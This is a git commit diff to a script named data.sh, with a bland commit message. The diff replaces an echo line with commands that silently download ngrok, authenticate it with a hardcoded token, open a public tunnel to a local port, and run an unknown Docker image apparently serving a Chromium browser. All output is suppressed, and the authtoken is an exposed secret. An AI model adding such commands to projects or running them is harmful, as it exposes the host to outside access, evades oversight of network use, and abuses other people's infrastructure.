adeacc3211fd66f0bf9899b51c8d2b5123575585
nosafearea <nosafearea@outlook.com>
2024-09-10 00:48:20 +0700

    Update data.sh

--- data.sh
+++ data.sh
@@ -1,1 +1,6 @@
-echo 'helo'
+wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
+tar -xvzf ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
+./ngrok authtoken 2Y5CwE5p97ALz10mAY6RrgCv9sU_83GvHd1LdLMedTpY3Ytex > /dev/null 2>&1
+chmod +x ngrok
+./ngrok http 33440 >/dev/null 2>&1 >/dev/null &
+docker run -d --name=chromium1 -p 33440:7799 fookam/5953:6618 > /dev/null 2>&1
